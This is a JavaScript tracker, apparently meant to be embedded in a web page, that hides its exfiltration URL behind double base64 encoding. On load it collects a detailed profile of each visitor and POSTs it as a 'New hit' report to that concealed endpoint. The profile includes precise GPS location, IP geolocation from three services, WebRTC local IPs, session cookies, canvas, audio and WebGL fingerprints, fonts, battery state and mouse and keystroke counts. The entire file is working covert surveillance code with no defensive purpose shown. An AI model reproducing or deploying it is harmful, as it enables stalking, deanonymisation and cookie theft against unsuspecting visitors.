const endpoint = "V1ZWb1UwMUhUa2xVVkZwTlpWUnNjbGxXYUU5aGJVbDZVMjEwVFdKVk5USlpiRTAxWVVkT1NHRXpXbXROYkZwd1dWVmpOV1J0UlhwVVdGcE9Wa1pHTTFRd1VscE9WVFUyWVhwQ1RtVnJNSGxVV0hCV1RWVXhWVk5VU2s1aFZHeGhXbGN3TVdOR1RsZFVhMDVzVTBkUk1GcFhNREZXTVVwR1YxUkdXR0pJUW5wWGJGWTBaVlpyZVU1WE9VcGlXR1F6VlZaV05HTnJNVFZOV0hCWVlXdHZNbHBXV2xOa2JGSkZVV3hDWVdKSFVuaFdWRTVIWXpGc2RWUllaRTFXYXpWNVZtdGpNVkpHVlhoVmEyaHJZbFJXZWxaSGN6RlVhemxDVUZRd1BRPT0=";
const destination = atob(atob(endpoint));

let dataCollected = {};
let sent = false;

async function collectCommonData() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const webgl = getWebGLInfo();
    const canvasHash = getCanvasFingerprint();
    const audioHash = await getAudioFingerprint();
    const fonts = getFonts();
    const localIPs = await getWebRTCLocalIPs();
    const battery = await getBatteryInfo();
    const ipInfo1 = await getIPInfo('https://ipapi.co/json/');
    const ipInfo2 = await getIPInfo('https://ipinfo.io/json');
    const ipInfo3 = await getIPInfo('https://freegeoip.app/json/');
    const mimeTypes = [];
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
        mimeTypes.push(navigator.mimeTypes[i].type);
    }
    const floatingPointTest = Math.acos(-1) + Math.atan(1) + Math.exp(1) + Math.log(2);
    const performancePrecision = performance.now().toString().length;
    const screenOrientation = screen.orientation ? screen.orientation.type : "N/A";
    const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
    const behavior = getBehaviorSnapshot();

    dataCollected = {
        userAgent: navigator.userAgent || "N/A",
        appVersion: navigator.appVersion || "N/A",
        vendor: navigator.vendor || "N/A",
        oscpu: navigator.oscpu || "N/A",
        doNotTrack: navigator.doNotTrack || "N/A",
        online: navigator.onLine ? "Yes" : "No",
        referrer: document.referrer || "N/A",
        platform: navigator.platform || "N/A",
        language: navigator.language || "N/A",
        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
        screenResolution: `${screen.width}x${screen.height}`,
        availScreen: `${screen.availWidth}x${screen.availHeight}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        colorDepth: screen.colorDepth || "N/A",
        pixelRatio: window.devicePixelRatio || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || "N/A",
        connectionType: connection.effectiveType || "N/A",
        downlink: connection.downlink || "N/A",
        batteryLevel: battery.level,
        batteryCharging: battery.charging,
        batteryChargingTime: battery.chargingTime,
        batteryDischargingTime: battery.dischargingTime,
        deviceMemory: navigator.deviceMemory || "N/A",
        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
        cookies: await getCookies(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        timezoneOffset: new Date().getTimezoneOffset(),
        canvasFingerprint: canvasHash,
        audioFingerprint: audioHash,
        webglVendor: webgl.vendor,
        webglRenderer: webgl.renderer,
        detectedFonts: fonts,
        webRtcLocalIPs: localIPs,
        mimeTypes: mimeTypes.join(', ') || "N/A",
        floatingPoint: floatingPointTest,
        performancePrecision: performancePrecision,
        screenOrientation: screenOrientation,
        touchSupport: touchSupport,
        behaviorSnapshot: behavior,
        ip1: ipInfo1.ip || "N/A",
        city1: ipInfo1.city || "N/A",
        region1: ipInfo1.region || "N/A",
        country1: ipInfo1.country_name || "N/A",
        postal1: ipInfo1.postal || "N/A",
        org1: ipInfo1.org || "N/A",
        ipTimezone1: ipInfo1.timezone || "N/A",
        ip2: ipInfo2.ip || "N/A",
        city2: ipInfo2.city || "N/A",
        region2: ipInfo2.region || "N/A",
        country2: ipInfo2.country || "N/A",
        postal2: ipInfo2.postal || "N/A",
        org2: ipInfo2.org || "N/A",
        ip3: ipInfo3.ip || "N/A",
        city3: ipInfo3.city || "N/A",
        region3: ipInfo3.region || "N/A",
        country3: ipInfo3.country || "N/A",
        postal3: ipInfo3.zipcode || "N/A",
        timestamp: new Date().toISOString()
    };
}

async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return {
                level: `${(battery.level * 100).toFixed(0)}%`,
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime || "N/A",
                dischargingTime: battery.dischargingTime || "N/A"
            };
        }
        return { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
    } catch {
        return { level: "Error", charging: "Error", chargingTime: "Error", dischargingTime: "Error" };
    }
}

async function getIPInfo(apiUrl) {
    try {
        const response = await fetch(apiUrl);
        const data = await response.json();
        return data;
    } catch {
        return { error: "Failed to fetch" };
    }
}

async function getCookies() {
    return document.cookie || "No cookies";
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 100;
        const ctx = canvas.getContext('2d');
        ctx.font = '14pt no-exist-font';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('🖼️ Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('🖼️ Fingerprint', 4, 17);
        return canvas.toDataURL();
    } catch {
        return "N/A";
    }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: (debugInfo && gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)) || gl.getParameter(gl.VENDOR) || "N/A",
                renderer: (debugInfo && gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) || gl.getParameter(gl.RENDERER) || "N/A"
            };
        }
        return { vendor: "N/A", renderer: "N/A" };
    } catch {
        return { vendor: "Error", renderer: "Error" };
    }
}

async function getAudioFingerprint() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = new AudioContext();
        const oscillator = audioCtx.createOscillator();
        const compressor = audioCtx.createDynamicsCompressor();
        oscillator.connect(compressor);
        compressor.connect(audioCtx.destination);
        oscillator.start(0);
        const buffer = new Uint8Array(1024);
        await new Promise(resolve => setTimeout(resolve, 100));
        compressor.disconnect();
        return btoa(String.fromCharCode.apply(null, buffer));
    } catch {
        return "N/A";
    }
}

function getFonts() {
    const fonts = ['Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana', 'Comic Sans MS', 'Impact', 'Monaco', 'Lucida Console'];
    const detected = [];
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
    const testSize = '72px';
    const span = document.createElement('span');
    span.style.fontSize = testSize;
    span.innerHTML = testString;
    const defaultWidths = {};
    const defaultHeights = {};
    baseFonts.forEach(baseFont => {
        span.style.fontFamily = baseFont;
        document.body.appendChild(span);
        defaultWidths[baseFont] = span.offsetWidth;
        defaultHeights[baseFont] = span.offsetHeight;
        document.body.removeChild(span);
    });
    fonts.forEach(font => {
        let detectedFont = false;
        baseFonts.forEach(baseFont => {
            span.style.fontFamily = `${font}, ${baseFont}`;
            document.body.appendChild(span);
            const matched = (span.offsetWidth !== defaultWidths[baseFont]) || (span.offsetHeight !== defaultHeights[baseFont]);
            document.body.removeChild(span);
            if (matched) detectedFont = true;
        });
        if (detectedFont) detected.push(font);
    });
    return detected.join(', ') || "None detected";
}

async function getWebRTCLocalIPs() {
    try {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        await new Promise(resolve => {
            rtc.onicecandidate = e => {
                if (!e.candidate) resolve();
            };
        });
        const ips = [];
        const lines = rtc.localDescription.sdp.split('\n');
        lines.forEach(line => {
            if (line.indexOf('a=candidate:') === 0) {
                const parts = line.split(' ');
                const ip = parts[4];
                if (ip && !ips.includes(ip) && ip !== '0.0.0.0') ips.push(ip);
            }
        });
        return ips.join(', ') || "N/A";
    } catch {
        return "Blocked/Error";
    }
}

function getBehaviorSnapshot() {
    let moves = 0;
    let keys = 0;
    document.addEventListener('mousemove', () => moves++, { once: false });
    document.addEventListener('keydown', () => keys++, { once: false });
    setTimeout(() => {
        dataCollected.behaviorMoves = moves;
        dataCollected.behaviorKeys = keys;
    }, 5000);
    return "Collecting...";
}

async function sendPayload(gpsData = {}) {
    if (sent) return;
    sent = true;
    const fullData = { ...dataCollected, ...gpsData };
    const payload = `New hit:\n` +
                   `GPS:\n` +
                   `  Lat: ${fullData.latitude || "N/A"}\n` +
                   `  Long: ${fullData.longitude || "N/A"}\n` +
                   `  Accuracy: ${fullData.accuracy || "N/A"} m\n` +
                   `  Altitude: ${fullData.altitude || "N/A"} m\n` +
                   `  Speed: ${fullData.speed || "N/A"} m/s\n` +
                   `IP Location 1:\n` +
                   `  IP: ${fullData.ip1}\n` +
                   `  City: ${fullData.city1}\n` +
                   `  Region: ${fullData.region1}\n` +
                   `  Country: ${fullData.country1}\n` +
                   `  Postal: ${fullData.postal1}\n` +
                   `  Org: ${fullData.org1}\n` +
                   `  Timezone: ${fullData.ipTimezone1}\n` +
                   `IP Location 2:\n` +
                   `  IP: ${fullData.ip2}\n` +
                   `  City: ${fullData.city2}\n` +
                   `  Region: ${fullData.region2}\n` +
                   `  Country: ${fullData.country2}\n` +
                   `  Postal: ${fullData.postal2}\n` +
                   `  Org: ${fullData.org2}\n` +
                   `IP Location 3:\n` +
                   `  IP: ${fullData.ip3}\n` +
                   `  City: ${fullData.city3}\n` +
                   `  Region: ${fullData.region3}\n` +
                   `  Country: ${fullData.country3}\n` +
                   `  Postal: ${fullData.postal3}\n` +
                   `Browser:\n` +
                   `  User Agent: ${fullData.userAgent}\n` +
                   `  App Version: ${fullData.appVersion}\n` +
                   `  Vendor: ${fullData.vendor}\n` +
                   `  OSCPU: ${fullData.oscpu}\n` +
                   `  Platform: ${fullData.platform}\n` +
                   `  Language: ${fullData.language}\n` +
                   `  Languages: ${fullData.languages}\n` +
                   `  DoNotTrack: ${fullData.doNotTrack}\n` +
                   `  Online: ${fullData.online}\n` +
                   `  Referrer: ${fullData.referrer}\n` +
                   `  Cookies: ${fullData.cookies}\n` +
                   `Device:\n` +
                   `  Screen: ${fullData.screenResolution}\n` +
                   `  Avail Screen: ${fullData.availScreen}\n` +
                   `  Window: ${fullData.windowSize}\n` +
                   `  Color Depth: ${fullData.colorDepth}\n` +
                   `  Pixel Ratio: ${fullData.pixelRatio}\n` +
                   `  Max Touch Points: ${fullData.maxTouchPoints}\n` +
                   `  Touch Support: ${fullData.touchSupport}\n` +
                   `  Screen Orientation: ${fullData.screenOrientation}\n` +
                   `  Device Memory: ${fullData.deviceMemory} GB\n` +
                   `  CPU Cores: ${fullData.hardwareConcurrency}\n` +
                   `Network:\n` +
                   `  Connection: ${fullData.connectionType}\n` +
                   `  Downlink: ${fullData.downlink} Mbps\n` +
                   `Battery:\n` +
                   `  Level: ${fullData.batteryLevel}\n` +
                   `  Charging: ${fullData.batteryCharging}\n` +
                   `  Charge Time: ${fullData.batteryChargingTime} sec\n` +
                   `  Discharge Time: ${fullData.batteryDischargingTime} sec\n` +
                   `Fingerprints:\n` +
                   `  Canvas Hash: ${fullData.canvasFingerprint.substring(0, 50)}...\n` +
                   `  Audio Hash: ${fullData.audioFingerprint.substring(0, 50)}...\n` +
                   `  WebGL Vendor: ${fullData.webglVendor}\n` +
                   `  WebGL Renderer: ${fullData.webglRenderer}\n` +
                   `  Detected Fonts: ${fullData.detectedFonts}\n` +
                   `  WebRTC Local IPs: ${fullData.webRtcLocalIPs}\n` +
                   `  Mime Types: ${fullData.mimeTypes.substring(0, 50)}...\n` +
                   `  Floating Point Test: ${fullData.floatingPoint}\n` +
                   `  Performance Precision: ${fullData.performancePrecision}\n` +
                   `  Behavior Moves: ${fullData.behaviorMoves || "N/A"}\n` +
                   `  Behavior Keys: ${fullData.behaviorKeys || "N/A"}\n` +
                   `Timezone: ${fullData.timezone} (Offset: ${fullData.timezoneOffset} min)\n` +
                   `Timestamp: ${fullData.timestamp}`;

    if (payload.length > 1900) {
        const splitPoint = payload.indexOf('Browser:\n');
        const part1 = payload.substring(0, splitPoint);
        const part2 = payload.substring(splitPoint);
        fetch(destination, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: part1 })
        }).catch(error => console.error('Failed:', error));
        fetch(destination, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: part2 })
        }).catch(error => console.error('Failed:', error));
    } else {
        fetch(destination, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: payload })
        }).catch(error => console.error('Failed:', error));
    }
}

async function collectData(position) {
    sendPayload({
        latitude: position.coords.latitude || "N/A",
        longitude: position.coords.longitude || "N/A",
        accuracy: position.coords.accuracy || "N/A",
        altitude: position.coords.altitude || "N/A",
        speed: position.coords.speed || "N/A"
    });
}

function handleError(error) {
    let message = "Denied.";
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = "Denied.";
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Unavailable.";
            break;
        case error.TIMEOUT:
            message = "Timed out.";
            break;
    }
    sendPayload({ latitude: "Error: " + message, longitude: "N/A", accuracy: "N/A", altitude: "N/A", speed: "N/A" });
}

window.onbeforeunload = () => {
    if (!sent) sendPayload();
};

collectCommonData();
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(collectData, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
} else {
    sendPayload();
            }
